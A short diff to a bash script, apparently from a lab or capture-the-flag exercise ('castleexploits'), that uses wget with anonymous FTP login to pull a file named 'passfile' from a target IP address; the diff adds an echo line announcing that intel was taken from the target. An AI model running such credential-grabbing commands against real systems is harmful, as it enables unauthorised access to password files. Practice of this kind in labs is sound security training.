@@ -1,5 +1,6 @@
 #!/bin/bash
 wget --ftp-user=anonymous --ftp-password="" ftp://10.252.41.120/passfile
+echo "Intel attained via files pulled down from target via anonymous FTP!"
 
 
 #Complete except for making the IP passable and delivering to /home/ncraf/castleexploits
